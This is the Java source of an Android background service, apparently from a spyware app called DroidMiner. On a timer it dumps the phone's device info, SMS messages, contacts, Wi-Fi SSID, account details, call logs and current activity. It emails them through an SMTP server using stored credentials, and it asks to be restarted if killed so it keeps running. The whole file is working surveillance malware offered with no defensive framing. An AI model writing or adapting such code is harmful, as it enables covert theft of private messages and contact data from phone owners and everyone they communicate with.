package com.miner.droidminer;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.miner.droidminer.modules.Constants;
import com.miner.droidminer.modules.Dumper;
import com.miner.droidminer.modules.Mailer;
import com.miner.droidminer.modules.MessageBuilder;
import com.miner.droidminer.modules.Util;


import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

public class DroidMinerService extends Service {
    public DroidMinerService() {
    }

    public void onCreate() {
        Timer goodTimer = new Timer();
        goodTimer.schedule(new DroidMinerTimer(), 0, Constants.timer);
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public int onStartCommand (Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy () {
        Log.d ("MINER", "Miner has stopped!");
    }

    class DroidMinerTimer extends TimerTask {
        public void run () {
            Dumper dumper = new Dumper();
            MessageBuilder messageBuilder = null;
            try {
                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

                if (telephonyManager.getSimState() != TelephonyManager.SIM_STATE_READY) {
                    messageBuilder = new MessageBuilder(new JSONObject().put("info", dumper.dumpInfo(getApplicationContext())));
                }
                else {
                    messageBuilder = new MessageBuilder(new JSONObject()
                            .put("info", dumper.dumpInfo(getApplicationContext()))
                            .put("sms", dumper.dumpSMS(getApplicationContext()))
                            .put("wifi", Util.getCurrentSSID(getApplicationContext()))
                            .put("contacts", dumper.dumpContacts(getApplicationContext()))
                            .put("activity", dumper.getCurrentActivity(getApplicationContext()))
                            .put("account", dumper.getAccount(getApplicationContext()))
                            .put("call_logs", dumper.getCallLogs(getApplicationContext()))
                    );
                }
            } catch (Exception e) {
                Log.e ("Dump All Error", e.getMessage());
            }
            Log.d ("Device Information", dumper.dumpInfo(getApplicationContext()).toString());
            //Log.d("Current Activity", dumper.getCurrentActivity(getApplicationContext()).toString());
            Log.d("Account", dumper.getAccount(getApplicationContext()).toString());
            Log.d("Call Logs", dumper.getCallLogs(getApplicationContext()).toString());

            Mailer m = new Mailer ();
            if (messageBuilder != null) {
                m.sendMail (
                        Constants.SMTP_SERVER,
                        Constants.FROM,
                        Constants.TO,
                        Constants.SUBJECT,
                        messageBuilder.buildHtml(),
                        Constants.LOGIN,
                        Constants.PASSWORD,
                        null
                );
            }
        }
    }
}
